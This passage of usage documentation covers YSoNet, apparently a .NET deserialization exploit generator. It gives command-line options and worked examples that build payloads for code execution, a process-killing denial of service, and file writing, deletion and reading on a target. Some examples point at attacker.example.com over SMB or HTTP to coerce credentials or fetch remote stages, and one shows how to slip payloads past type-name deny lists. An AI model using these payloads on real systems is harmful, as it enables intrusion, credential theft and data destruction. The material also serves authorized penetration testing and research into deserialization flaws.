# Usage and Examples

Command-line reference for YSoNet, plus worked examples. For the gadget and plugin catalog, see [Gadgets and Plugins](gadgets-and-plugins.md).

Back to [documentation index](README.md).

## Command line

Use `ysonet.exe --fullhelp` to see the full details. You can also see a specific gadget's or plugin's help:

- `ysonet.exe -g NameHere -help`
- `ysonet.exe -p NameHere -help`

```text
Usage: ysonet.exe [options]
Options:
  -p, --plugin=VALUE         The plugin to be used.
  -o, --output=VALUE         The output format (raw|base64|raw-
                               urlencode|base64-urlencode|hex).
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter.
  -c, --command=VALUE        The command to be executed.
      --rawcmd               Command will be executed as is without `cmd /c `
                               being appended (anything after first space is an
                               argument).
  -s, --stdin                The command to be executed will be read from
                               standard input.
      --bgc, --bridgedgadgetchains=VALUE
                             Chain of bridged gadgets separated by comma (,).
                               Each gadget will be used to complete the next
                               bridge gadget. The last one will be used in the
                               requested gadget. This will be ignored when
                               using the searchformatter argument.
  -t, --test                 Whether to run payload locally. Default: false
      --outputpath=VALUE     The output file path. It will be ignored if
                               empty.
      --minify               Whether to minify the payloads where applicable.
                               Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple
                               (always `true` with `--minify` for binary
                               formatters). Default: true
      --raf, --runallformatters
                             Try every listed non denial-of-service gadget
                               whose formatter name contains the given text.
                               Requires -f plus -c or -s, and cannot be
                               combined with -g or -p. Uses each formatter's
                               default output format, ignores -o and -t, prints
                               payloads with their length, and reports per-
                               payload failures plus a summary on stderr.
                               Default: false
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant
                               gadgets and their formatters (other parameters
                               will be ignored).
      --list=VALUE           Print a machine-readable list (one item per line)
                               and exit. Categories:
                               gadgets|plugins|formatters|options|outputs. Add
                               -g <gadget> to list that gadget's
                               formatters/options, or -p <plugin> to list that
                               plugin's options. Useful for shell tab-completion
                               scripts.
      --category=VALUE       Find gadgets by category (repeatable):
                               --category=axis=value where axis is
                               kind|formatter|input|requirement|version. Repeat
                               for OR within an axis and AND across axes. A
                               version is an exact runtime build (4.8.1, 5.0,
                               mono) and only lists gadgets recorded as working
                               there. Alone it prints matching gadgets and their
                               categories; with '--list gadgets' it prints
                               matching names only. Example:
                               --category=kind=code-execution
                               --category=formatter=Json.NET
      --debugmode            Enable debugging to show exception errors and
                               output length
  -h, --help                 Shows this message and exit.
      --fullhelp             Shows this message + extra options for gadgets
                               and plugins and exit.
      --prv, --display-private
                             Also list private gadgets and plugins in --help,
                               --fullhelp, --credit, --list, --sf, --raf, --
                               category and interactive mode. They always build
                               when named on the command line; this only shows
                               them in listings.
      --credit               Shows the credit/history of gadgets and plugins
                               (other parameters will be ignored).
      --checkupdate          Check GitHub for a newer YSoNet release and exit.
      --runmytest            Runs that `Start` method of `TestingArenaHome` -
                               useful for testing and debugging.
```

Note: Machine authentication code (MAC) key modifier is not used for LosFormatter in YSoNet. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.

## Find a gadget by category

Every gadget declares discovery metadata: its payload `kind`, the `formatter` (serializer) it supports, the `input` it accepts, its target `requirement`, and the runtime `version` its effect is recorded on. Use `--category=axis=value` to find gadgets by these facets. This is discovery only; it does not build a payload.

- Axes: `kind`, `formatter`, `input`, `requirement`, `version`.
- Repeat the same axis for OR; use different axes for AND. One gadget (or one of its variants) must match the whole query.

```bash
# Show all code-execution gadgets that support Json.NET, with their categories
./ysonet.exe --category=kind=code-execution --category=formatter=Json.NET

# Print only the matching gadget names (for scripts), by adding --list gadgets
./ysonet.exe --list gadgets --category=kind=network

# Gadgets recorded as working on a given runtime build
./ysonet.exe --category=version=4.8.1
./ysonet.exe --category=version=5.0
```

### The version axis

The other axes use broad words. This one uses exact build numbers, because "old
build" does not tell you whether a payload lands on the target in front of you.
Write it the way you say it: `4.8.1`, `.NET 4.8`, `net5.0`, `mono`, or the
canonical `net-fx-4.8.1`.

The version is always about the TARGET, never about the copy of ysonet you are
running. Two different target properties can decide it, and both appear on this
axis:

- the .NET version the target process RUNS ON, when a runtime change or a patch
  is what fixed the behaviour; and
- the .NET version the target application was BUILT AGAINST, when the gate is a
  compile-time compatibility switch.

`DataViewManagerXxe` and `DataSetXxe` are the second kind, and it is worth
knowing because it surprises people: they list 4.0 - 4.5.1 because
`XmlReaderSettings.EnableLegacyXmlSettings()` reads the target application's own
`TargetFrameworkAttribute`. A fully patched Windows box with .NET 4.8.1 runs
those payloads all day if the app hosting the deserializer was compiled against
4.5.1, and no machine runs them against an app compiled against 4.5.2 or later.
Installing or removing framework versions on the target changes nothing. It also
means `ysonet.exe -t` cannot fire them: this tool targets 4.7.2, so its own XML
reader gets a null resolver, which is why it prints a note saying so.

Read a listed version as "reproduced or documented here", never as "fails
everywhere else". A version that is not listed only means nobody recorded it.
Many gadgets are still `unspecified`, and where the real gate is not a version at
all (an OS patch, a library version, a machine-wide switch) the gadget stays
`unspecified` and says so in its own help text. Use `--category=version=unspecified`
to list what has not been pinned down yet.

Interactive mode has the same filter. Inside the "Build a gadget payload" flow, pick `[ Filter by category... ]` (or press `Ctrl+F` in the live columns) to open a checklist over the five axes with live match counts, then narrow the gadget list to what matches.

## Run all formatters (`--raf`)

`--raf` builds one payload for every gadget whose formatter name contains the text you
pass to `-f`. It is a bulk diagnostic: use it to see, in one run, which gadgets can reach
a serializer you have found on a target.

```bash
./ysonet.exe --raf -f SharpSerializerBinary -c calc.exe
```

A cell (one gadget with one of its formatters) is included when:

- the gadget appears in listings (add `--display-private` to widen that in a local checkout);
- it is not a denial-of-service gadget;
- and one of its advertised formatter strings contains your `-f` text, ignoring case.

Every included cell gets the **same** command and the same gadget options. That is the
point of the mode, and also its limit: gadgets do not accept the same kind of input. One
wants a command line, another an assembly path, another an absolute URL. So a run where
some cells fail is normal, not broken.

What each stream carries:

- **stdout**: the heading, the DoS skip notice when there is one, and each payload with
  its length.
- **stderr**: one line per failed cell, plus a summary.

```text
RAF failed: gadget=<name>, formatter=<name>: <reason>
RAF inspection failed: gadget=<name>: <reason>
RAF summary: matched=<M>, generated=<G>, failed=<F>, inspection-failed=<I>.
```

`matched` counts the cells the `-f` text selected, `generated` counts the payloads
actually written, and `failed` counts the rest, so `matched = generated + failed`.
`inspection-failed` counts gadgets that could not even be loaded or asked for their
formatter list.

Exit code: **0 when at least one payload was written**, non-zero when none was. It does
not mean every cell succeeded. If you need complete coverage, read `failed` and
`inspection-failed` from the summary rather than the exit code.

Rules for the other options:

- `-f` is required, and so is a command source: `-c` or `-s`. Without them the run stops
  with `--raf requires -f/--formatter and either -c/--command or -s/--stdin.`
- `-g` and `-p` select a different execution path, so combining them with `--raf` is
  refused rather than silently ignored: `--raf cannot be combined with -g/--gadget or
  -p/--plugin.`
- `--help`, `--fullhelp`, `--credit` and `--sf` still win over `--raf`, because printing
  information builds nothing.
- `-o` is ignored: every payload uses its own formatter's default output format.
- `-t` is ignored: a bulk run never executes a payload locally.
- `--outputpath` is honored. The first payload replaces the file, the rest are appended.
- A non-empty `-c` wins over `-s`, exactly as in a single-gadget run.
- Denial-of-service gadgets are always excluded, even with `--i-understand-dos`.

## Denial-of-service gadgets

A few gadgets do not run code: they disrupt or terminate the target process. They are
their own category (`kind=denial-of-service`) and YSoNet will not build one by accident.

```bash
# Find them
./ysonet.exe --category=kind=denial-of-service

# Without the acknowledgement, the run is refused
./ysonet.exe -g <DosGadget> -f Json.NET -c x
Refused: <DosGadget> is a denial-of-service gadget. Re-run with --i-understand-dos.

# With it, the payload is built and a warning is printed to stderr first
./ysonet.exe -g <DosGadget> -f Json.NET -c x --i-understand-dos
WARNING: <DosGadget> is a denial-of-service payload.
It can disrupt or terminate the target process.
Use it only against systems you are authorized to test.
```

The warning goes to stderr, so the payload on stdout stays clean and pipeable.
These gadgets are also left out of every "generate everything" run (`--raf` and the
interactive run-all). When the run actually left one out, it says so with a count before
the payloads; when the catalog has none, there is no notice at all:

```bash
./ysonet.exe --raf -f Json.NET -c calc.exe
Skipped 1 denial-of-service gadget. Run it by name with --i-understand-dos.
```

The same flag works for a gadget named in a `--bgc` chain, and for the plugins that
let you pick an inner gadget (`ViewState`, `Resx`, `SharePoint`).

### `WSManPluginInstance`

The catalog's denial-of-service gadget. It takes no `-c` at all: the whole payload is a
type name.

```bash
./ysonet.exe -g WSManPluginInstance -f Json.NET --i-understand-dos
{
    "$type":"System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
}
```

Building that object is the whole attack. Its finalizer frees a `GCHandle` that only
`GetEntryDelegate` ever allocates, and a deserializer never calls that, so the handle is
still the default one. Freeing it throws on the finalizer thread, and an exception there
terminates the process.

Two things to plan around:

- **The effect is asynchronous.** It happens on the target's next garbage collection, not
  when the payload is read. A busy process may die within moments; an idle one may take a
  while.
- **The target needs Windows PowerShell's `System.Management.Automation`.** That is the
  gate, not a framework version: the default `--assembly` value is the 3.0.0.0 GAC
  identity, unchanged from PowerShell 3.0 through Windows PowerShell 5.1. Most Windows
  systems have it; a stripped or PowerShell-free image does not. PowerShell 7 ships a
  different assembly identity and nothing here has been reproduced against it.

`--assembly` overrides that identity and is written exactly as typed, so you can point it
at a repackaged, renamed or differently versioned copy. Only an empty value is refused,
and the TYPE name never changes.

```bash
./ysonet.exe -g WSManPluginInstance -f Xaml --i-understand-dos \
    --assembly "System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
```

`-t` works, and it is the one gadget where it never deserializes in the YSoNet process.
The payload is written to a temp file, a child `ysonet.exe` reads it and forces a
collection, and the child is the one that dies:

```bash
./ysonet.exe -g WSManPluginInstance -f Json.NET --i-understand-dos -t
[self-test] WSManPluginInstance: a child ysonet process is about to be terminated on purpose. This process is not affected.
[self-test] WSManPluginInstance: running in a child process (this payload terminates the runtime when it fires).
[self-test] the child process terminated with exit code 0xE0434352: Unhandled Exception: System.InvalidOperationException: Handle is not initialized.
```

That really does kill a process on your machine, so keep it for a host you are happy to
experiment on.

## Private gadgets and plugins (`--display-private`)

A contributor can keep unpublished gadgets and plugins in the git-ignored
`ysonet/Generators/Private/` and `ysonet/Plugins/Private/` folders, which the build
already compiles. Such a module can declare itself PRIVATE, and then YSoNet does not
LIST it: it is absent from `--help`, `--fullhelp`, `--credit`, `--list`, `--sf`,
`--raf`, `--category`, the "not supported" suggestion lists, tab completion, and
every interactive screen. The point is recording and documentation hygiene - a demo
video or a generated document made from a normal run should not disclose unpublished
research.

```bash
# Private modules are back in every listing for this one run
./ysonet.exe --list gadgets --display-private
./ysonet.exe --help --prv
./ysonet.exe -i --prv
```

Two things do not change:

- **Generation is never gated.** Typing the full command for a private module works
  with no flag at all: `ysonet.exe -g <PrivateGadget> -f BinaryFormatter -c calc.exe`.
  The same goes for its own help (`-g <PrivateGadget> --help`) and the module-scoped
  listings (`--list formatters -g <PrivateGadget>`, `--list options -p <PrivatePlugin>`).
- **Errors stay generic.** A typo produces the same message and the same suggestion
  list as before, with the private names simply not in it. Nothing says "private" or
  asks for a flag.

This is not a security control. Anyone with the binary can pass the flag and the
mechanism is in public source; it stops accidental exposure, nothing more. A module
that is both private and `Hidden` still needs `--fullhelp --prv` to show up in help,
because the two rules compose.

## Tips

When specifying complex commands, it can be tedious to escape some special characters (`;`, `|`, `&`, ..). Use the stdin option (`-s`) to read the command from stdin:

```bash
cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
```

XmlSerializer and DataContractSerializer formatters generate a wrapper XML format including the expected type in the `type` attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated XML based on how XmlSerializer gets the expected type in your case.

## Examples

### Generate a calc.exe payload for Json.Net using the ObjectDataProvider gadget

```bash
./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
```

### Generate a calc.exe payload for BinaryFormatter using the PSObject gadget

```bash
./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

### Generate a run_command payload for DotNetNuke using its plugin

```bash
./ysonet.exe -p DotNetNuke -m run_command -c calc.exe
```

### Generate a read_file payload for DotNetNuke using its plugin

```bash
./ysonet.exe -p DotNetNuke -m read_file -f win.ini
```

### Write, copy, move or truncate a file on the target without starting a process

`TypeConfuseDelegateFileOperations` puts a two-string file method in the
TypeConfuseDelegate splice, so the deserializer itself does the file operation.
`--variant` picks the operation and decides what `-c` means, and `--rootcontainer`
picks the serialized root (1 SortedSet, 2 SortedDictionary, 3 TreeSet), exactly as
for the other TypeConfuseDelegate payloads.

```bash
# 1 write: drop the TEXT of a local file onto a target path
./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 1 -c "C:\inetpub\wwwroot\a.aspx;payload.aspx"

# 2 copy / 3 move a file, 4 move a directory: both paths are on the TARGET
./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 2 -c "C:\work\z-source.txt;C:\work\a-destination.txt"

# 5 empty: create the file, or truncate it if it exists
./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 5 -c "C:\work\empty.txt"
```

Two things to know:

- Only the FIRST `;` splits the value, so a destination path or embedded text may
  contain more of them. Quote the whole `-c` value in a shell.
- The sorted container hands its LARGER element to the operation first, so the
  first argument must sort strictly after the second using `String.CompareOrdinal`
  (the target path above the embedded text; the source path above the
  destination). ysonet refuses any other input instead of quietly swapping or
  rewriting what you typed. The second example is named so the source sorts
  higher; the first one only passes if the text in `payload.aspx` starts below
  the target path.

For variant 1 only, the second field is a file on YOUR machine. Its text is read
and embedded when the payload is built, so it does not need to exist on the
target. The transfer preserves characters, not bytes: a BOM is consumed on read
and `File.WriteAllText` writes UTF-8 without one.

One note on `--minify`: the XML minifier rewrites whitespace inside text content,
which would change the file the target ends up with. ysonet checks the minified
NetDataContractSerializer payload and refuses it when either string was rewritten
(trailing whitespace, a carriage return, and `"; "` are what get changed), instead
of shipping a payload that quietly delivers something else. BinaryFormatter and
LosFormatter carry the strings unchanged, so `--minify` works with them for any
input.

### Choose which ClaimsIdentity member carries a nested BinaryFormatter payload

`ClaimsIdentity.Deserialize` runs an unbindered `BinaryFormatter` on three
`SerializationInfo` names, and `WindowsIdentity` (mscorlib, built in) is the type
that reaches it. All three have the same effect, so `--variant` is there for a
target that filters, schemas, or logs on the member NAME.

```bash
# 1 (default) System.Security.ClaimsIdentity.actor - the shortest, unchanged
./ysonet.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe"

# 2 System.Security.ClaimsIdentity.bootstrapContext - the WIF-era name
./ysonet.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe" --variant 2

# 3 System.Security.ClaimsIdentity.claims - read back as a List<Claim>
./ysonet.exe -g WindowsIdentity -f BinaryFormatter -c "calc.exe" --variant 3
```

Every variant works on all six advertised formatters, and an unknown number falls
back to 1.

`WindowsClaimsIdentity` uses the SAME numbers for the same three keys, so the two
gadgets are learnable together. It adds a fourth: the WIF type's own `_actor`
member, which is a separate sink inside `Microsoft.IdentityModel` rather than
mscorlib's `ClaimsIdentity.Deserialize`. That form has to carry an `IntPtr`
member, which only BinaryFormatter, LosFormatter and NetDataContractSerializer can
express, so `--variant 4` is refused by name on the other three rather than
quietly building a different member. The whole gadget needs
`Microsoft.IdentityModel`, which is not in the GAC.

> Numbering change: `WindowsClaimsIdentity`'s variant numbers used to mean
> different members depending on `-f`. On BinaryFormatter, LosFormatter and
> NetDataContractSerializer, variant 1 was the WIF `_actor` form and 2/3 were
> `.actor`/`.bootstrapContext`; on the other three, 1 was `.actor`, 2 was
> `.bootstrapContext` and 3 silently fell through to 1. Every combination fired,
> so nothing ever failed. If you scripted a variant number against this gadget,
> re-check it: the WIF `_actor` form is now `--variant 4` everywhere it exists,
> and 1/2/3 are `.actor`/`.bootstrapContext`/`.claims` on every formatter.
> `WindowsIdentity` is unaffected.

One thing to watch when chaining: `--bgc` hands the SAME options to every gadget
in the chain, so `--variant` reaches the bridged gadget too. If that gadget does
not know the number, it refuses the chain and names itself in the error.

### Get the DataTable carrier past a type-name filter

`DataTableTypeSpoof` builds exactly the payload `DataTable` builds and writes a
different TYPE NAME on the wire: the name of a real SUBCLASS of
`System.Data.DataTable`. A subclass inherits the protected
`DataTable(SerializationInfo, StreamingContext)` constructor, and that constructor
is what rebuilds the rows, so a target that only rejects the base name by string
still builds the carrier and fires the inner gadget.

```bash
# the default in-box profile: System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection
./ysonet.exe -g DataTableTypeSpoof -f BinaryFormatter -c "calc.exe"

# the second in-box profile, one flag away (same assembly)
./ysonet.exe -g DataTableTypeSpoof -f SoapFormatter -c "calc.exe" \
    --target-type "System.Data.Entity.Design.SsdlGenerator.RelationshipDetailsCollection"

# a typed-DataSet table from the target's own assembly - both strings go on the wire
# verbatim; a nested type uses '+', so OrdersDataSet.OrdersDataTable is written like this:
./ysonet.exe -g DataTableTypeSpoof -f LosFormatter -c "calc.exe" \
    --target-type "Contoso.Data.OrdersDataSet+OrdersDataTable" \
    --target-assembly "Contoso.Data, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"
```

What actually goes in the two fields, measured on .NET Framework 4.8.1 (fires = the
payload deserialized and ran):

| `--target-type` | `--target-assembly` | BinaryFormatter | SoapFormatter |
|---|---|---|---|
| `...SsdlGenerator.TableDetailsCollection` (default) | full identity | fires | fires |
| `...SsdlGenerator.RelationshipDetailsCollection` | full identity | fires | fires |
| `System.Data.DataTable` | `System.Data` full identity | fires | fires |
| a typed-DataSet table subclass on the target | that app's assembly | fires | fires |
| a real subclass | partial name or wrong `Version=` | fires | no |
| a type that is not `[Serializable]` | resolvable assembly | no | no |
| any type | an assembly not on the target | no | no |

Three rules explain the table:

- THE ASSEMBLY MUST EXIST ON THE TARGET. ysonet never loads it - only names travel
  on the wire - but the target does, and a name it cannot resolve binds to nothing.
- THE TYPE MUST BE `[Serializable]`. A type that resolves but is not (say
  `SqlConnection`) is rejected before anything is built.
- SOAP IS STRICT, BINARYFORMATTER IS LENIENT ON THE ASSEMBLY NAME. SoapFormatter
  needs the full, correct assembly identity to resolve; a partial name or wrong
  version silently produces nothing. BinaryFormatter falls back to a partial load.
  Use the full identity always - it is what the default ships.

The best real-world names are TYPED DATASET tables: every `.xsd`-generated table
class derives from `TypedTableBase<T>` -> `DataTable` and is `[Serializable]`, so an
application built on typed DataSets has one per table. They are NESTED types, so the
wire name uses `+`: `MyApp.Data.OrdersDataSet+OrdersDataTable`.

Three things to know:

- WHEN THIS HELPS. A deny list, a naive `SerializationBinder`, or a signature that
  matches `System.Data.DataTable` in the bytes. It does nothing against an
  ALLOWLIST, and nothing against a target that does not deserialize a DataTable at
  all. This is the same idea watchTowr used for CVE-2025-23120 in Veeam Backup &
  Replication, where the application's own `DataSet` subclasses walked through a
  deny list that named only the base type.
- IT IS NOT THE `DataSetTypeSpoof` TRICK. That one appends `, x=]` to a real type
  name and relies on how a binder parses the string; the type is still
  `System.Data.DataSet`. Here the name is a type that really exists, and the target
  resolves it normally.
- WHAT THE DEFAULT NEEDS. `System.Data.Entity.Design`, which ships with the full
  .NET Framework (not the Client Profile). If the target does not have it, name a
  subclass it does have (see the typed-DataSet note above). Nothing you type is
  validated - only an empty value is refused - because what a name resolves to is
  the target's decision.
- TWO HALVES OF THE TECHNIQUE. The name getting past the filter is one half; the
  target then rebuilding a real `DataTable` from the payload, through the subclass's
  inherited constructor, is the other. That second half is what matters when the
  target CASTS the deserialized root to `DataTable`, and it needs a name that
  resolves to a real `DataTable` subclass - a bogus name gets the inner gadget to
  fire (it is materialised first) but leaves no usable root object.

`--variant` works exactly as it does on `DataTable`: 1 (default) is the
`TextFormattingRunProperties` inner, 2 is the built-in `TypeConfuseDelegate` inner,
which drops SoapFormatter because it is generic.

### Delete files on the target when the object is disposed or collected

`TempFileCollection` uses `System.CodeDom.Compiler.TempFileCollection`, whose
cleanup path calls `File.Delete` on every path it was given. `-c` is the first
path, and `--extrafile` adds more - repeat it once per extra path.

```bash
# one file
./ysonet.exe -g TempFileCollection -f BinaryFormatter -c "C:\inetpub\wwwroot\web.config"

# several files, one --extrafile each
./ysonet.exe -g TempFileCollection -f BinaryFormatter -c "C:\app\a.log" --extrafile "C:\app\b.log" --extrafile "C:\app\c.log"

# a UNC path works too, because File.Delete accepts one
./ysonet.exe -g TempFileCollection -f SoapFormatter -c "\\fileserver\share\report.xlsx"
```

Four things to know:

- THE TIMING IS THE TARGET'S, NOT YOURS. The deletion runs from
  `IDisposable.Dispose()`, which is deterministic but needs the target to dispose
  the object, or from the finalizer, which needs the object to become unreachable
  AND a garbage collection to run its finalizer queue. It can happen at once,
  much later, or never if the process exits first.
- Nothing reports back. The framework wraps each `File.Delete` in its own empty
  `catch`, so a missing file, a locked file and a permission error all look the
  same: silence.
- Every path is a path on the TARGET. It is not opened, resolved or checked on
  your machine, so a relative path resolves against the deserializing process's
  working directory. Paths that differ only by case are collapsed into one entry.
- `-t` is a self-exploit and is genuinely DESTRUCTIVE here. It deserializes the
  payload on your machine, which builds a real `TempFileCollection` holding YOUR
  paths and lets its finalizer DELETE your own files. So `-t` only paths you are
  willing to lose; a `--minify`-rewritten path is refused before `-t` can delete
  anything.

The same path-fidelity rule as above applies, and a little more strictly: because
this gadget deletes what it names, ysonet checks every payload it produces and
refuses one where a path was rewritten. `--minify` on an XML formatter is one
cause; the other is the DataContractSerializer writer, which loses a carriage
return even without `--minify`. BinaryFormatter and LosFormatter carry any path
unchanged.

### Make the target call out over UNC/SMB

`FileSystemInfo` uses `System.IO.FileSystemInfo`, whose serialization constructor
normalizes whatever path you put in `-c`. Normalization expands MS-DOS short
names, and expanding one inside a UNC path means asking the remote host what the
long name is - which is the outbound SMB request.

```bash
# the target resolves attacker.example.com and opens an SMB request to it
./ysonet.exe -g FileSystemInfo -f BinaryFormatter -c "\\attacker.example.com\share\aaaaaa~1\x"

# the same thing as System.IO.FileInfo instead of System.IO.DirectoryInfo
./ysonet.exe -g FileSystemInfo -f Json.NET --variant 2 -c "\\attacker.example.com\share\aaaaaa~1\x"

# a trailing component is not required: the last component counts too
./ysonet.exe -g FileSystemInfo -f SoapFormatter -c "\\attacker.example.com\share\aaaaaa~1"
```

Four things to know:

- THE `~` IS WHAT MAKES IT CALL OUT. mscorlib asks Windows to expand a path only
  when some COMPONENT contains `~` and is at most 12 characters long. So
  `\\host\share\file` reaches nobody, and neither does
  `\\host\share\a-long-name~1\x`, whose `~` component is too long. Nothing is
  refused over this - what a target's path handling really accepts is what you
  are testing - but `--debugmode` tells you when the value you gave cannot
  trigger the expansion.
- IT PROVES A CALLBACK ATTEMPT, NOTHING MORE. A hit means the target resolved
  your host and opened an SMB request. It is not proof of a completed SMB
  session, of NTLM authentication, of captured credentials, or of a relay. Those
  depend on the target, the network and your endpoint.
- THE TWO VARIANTS DO THE SAME THING. `FileSystemInfo` is abstract, so the
  payload names a concrete subclass: variant 1 is `DirectoryInfo` and variant 2
  is `FileInfo`. Both run the same base constructor first, so the callback
  happens before either of their own permission checks. `FileInfo` adds a
  `FileIOPermission` read demand, which only matters if the target runs
  partially trusted.
- `-t` WORKS, and it means what it means everywhere else: the payload is
  deserialized HERE, so YOUR machine performs the callback. Windows sends
  authentication material when it opens an SMB session, so point it only at an
  endpoint you own, and think twice on a machine whose outbound traffic you would
  rather not explain.

The path is the whole payload, so ysonet checks that the payload it emitted still
carries your path exactly and refuses rather than shipping one the XML minifier
rewrote (see the minification note above). `--rawinput` hands both the escaping
and that check to you.

### Make the target fetch and load remote WPF markup

`ResourceDictionary` uses `System.Windows.ResourceDictionary.Source`, a `Uri`
property whose SETTER does the work: it opens a `WebRequest` for whatever you put
in `-c` and then hands the response to the WPF markup loader. That is two effects
from one very short document, and which one you get depends only on what you
point it at.

```bash
# the target fetches your XAML and LOADS it, so whatever the document declares is built
./ysonet.exe -g ResourceDictionary -f Xaml -c "http://attacker.example.com/x.xaml"

# no hosted content needed: opening the SMB session IS the effect
./ysonet.exe -g ResourceDictionary -f Xaml -c "\\attacker.example.com\share\x"

# a path on the target works too - nothing here is resolved on your machine
./ysonet.exe -g ResourceDictionary -f Xaml -c "C:\ProgramData\x.xaml"
```

The whole payload is one element:

```xml
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" Source="http://attacker.example.com/x.xaml"/>
```

Four things to know:

- THE FETCH ALWAYS HAPPENS, THE LOAD NEEDS A TYPE WPF MAPS. The request goes out
  before anything is parsed. What comes back is only turned into objects when WPF
  has a converter for it - `application/xaml+xml` for XAML, `application/baml+xml`
  for compiled BAML. But you usually do not have to set that header at all: when
  the response is labelled `text/plain` or `application/octet-stream` and the URL
  ends in `.xaml` or `.xbap`, WPF DISCARDS the header and picks the type from the
  extension, so a plain static file server works as-is. An unmapped type such as
  `application/x-whatever` does stop it, and you get the callback and nothing more.
- THE UNC FORM SENDS AUTHENTICATION MATERIAL. Windows authenticates when it opens
  an SMB session, so a UNC value is a credential-coercion primitive and needs no
  hosted content at all. Point it only at an endpoint you own.
- XAML IS THE ONLY FORMATTER, and that is measured, not an oversight.
  `ResourceDictionary` implements `IDictionary`, so Json.NET, JavaScriptSerializer
  and YamlDotNet build the object and then file `Source` away as a dictionary KEY
  without ever calling the setter - no error, no request. `Source` is also typed
  `Uri`, which FastJson and both SharpSerializer modes cannot construct from a
  string. The runtime formatters refuse the type outright (it is not
  `[Serializable]`), and MessagePack Typeless has
  `System.Windows.ResourceDictionary` on its own hardcoded deny list.
- `-t` WORKS, and it means what it means everywhere else: the payload is
  deserialized HERE, so YOUR machine performs the fetch and loads what comes back.

`-c` is taken exactly as you typed it - no scheme check, no host check, no
extension check - because what resolves is the target's decision. The only two
refusals are an empty value and one `--minify` would rewrite: the value lives in
an XML attribute and the XML minifier collapses `"; "`, so ysonet re-reads its own
emitted document and refuses rather than shipping a payload that quietly fetches
a different URL. `--rawinput` hands both the escaping and that check to you.

This replaces `ObjectDataProvider --variant 3 --xamlurl`, and the URL is now an
ordinary `-c`. IF YOU HAVE SCRIPTS: `ObjectDataProvider --var 3` no longer builds
anything - it now fails with a message pointing here. Its `--var 4` fails the same
way and points at the new `WorkflowDesigner` gadget below. Neither number is
reused, so a script that used one gets an error rather than a different payload.
The `TextFormattingRunProperties --xamlurl` option and the SharePoint plugin's
`--useurl` mode are unchanged and now carry this gadget's document.

### Read a file, load a `.resources`, or activate a type through ResXFileRef

`ResXFileRef` carries `[TypeConverter(typeof(Converter))]`, and that converter is
the whole gadget. Given one string - a path, a type name and an optional encoding -
the deserializing process resolves the type with `Type.GetType` and then OPENS THE
PATH. What it does with the bytes depends only on the type name, so the gadget has
three variants and needs no resource file anywhere:

```bash
# variant 1: the target reads the file and hands the TEXT back as the value
./ysonet.exe -g ResXFileRef -f Xaml -c "C:\inetpub\wwwroot\web.config" --variant 1

# variant 1 with an encoding, and a UNC path - opening the SMB session coerces auth
./ysonet.exe -g ResXFileRef -f Xaml -c "\\attacker.example.com\share\web.config" --variant 1 --enc utf-8

# variant 2 (default): the target's ResourceSet reads a .resources file with BinaryFormatter
./ysonet.exe -g ResXFileRef -f YamlDotNet -c "\\attacker.example.com\share\stage.resources" --variant 2

# variant 3: activate the type you name, with the file's bytes as its Stream argument
./ysonet.exe -g ResXFileRef -f Xaml -c "\\attacker.example.com\share\blob.bin" --variant 3 --type "System.IO.BufferedStream, mscorlib"
```

The Xaml payload is one element whose TEXT is the converter value:

```xml
<ResXFileRef xmlns="clr-namespace:System.Resources;assembly=System.Windows.Forms">\\attacker.example.com\share\stage.resources;System.Resources.ResourceSet, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</ResXFileRef>
```

Variant 2 is a two-step chain. Build the second-stage `.resources` with the Resx
plugin, host it on your share, and point `-c` at it:

```bash
# 1. build a BinaryFormatter .resources that runs a command
./ysonet.exe -p Resx -m CompiledDotResources -c calc.exe -of stage.resources
# 2. host stage.resources, then send the ResXFileRef payload from above
```

Things to know:

- THE TYPE NAME DECIDES THE EFFECT. Variant 3 is a bring-your-own variant: what
  happens is decided entirely by the type you name (it needs one public instance
  constructor taking a `Stream`), so it is NOT necessarily code execution and its
  category is `other`, not `code-execution`.
- A PATH WITH `;` IS QUOTED FOR YOU, following `ResXFileRef.ToString()`, because the
  converter reads an unquoted path only up to the first `;`. A path containing `"`
  cannot be expressed - the framework's own parser cannot express it either.
- TWO FORMATTERS, and it is structural. Xaml hands an element's initialization text
  to the converter and YamlDotNet resolves a tagged root scalar and converts it;
  every other serializer either needs a parameterless constructor and a writable
  member (it has neither), rebuilds the object from its fields and never runs the
  converter (a clean round trip that reads nothing), or has nowhere to declare the
  type. The `RestrictiveXamlXmlReader` used by the WPF clipboard and XPS sinks drops
  this payload silently.
- `-t` IS ACCEPTED ON EVERY VARIANT, because in ysonet `-t` is a self-exploit: it
  deserializes the payload on YOUR machine, so the effect fires on you. Variant 1 reads
  the file back, variant 2 runs a BinaryFormatter over the `.resources` you point `-c` at,
  variant 3 activates your named type - all in the ysonet process. Only `-t` a file and a
  type you trust, because you are running them on yourself.

The Resx plugin reaches the SAME converter through a RESX document, and its
`indirect_resx_file` mode now takes the same knobs. The default is byte-for-byte
what it always emitted, so existing commands are unchanged:

```bash
# unchanged default: names ResXResourceSet, loads the file as a .resources document
./ysonet.exe -p Resx -m indirect_resx_file -F "\\attacker.example.com\share\stage.resources"

# read the file back instead, in a chosen encoding
./ysonet.exe -p Resx -m indirect_resx_file -F "\\attacker.example.com\share\web.config" --type "System.String" --enc utf-8
```

### Smuggle a XAML payload as a plain string

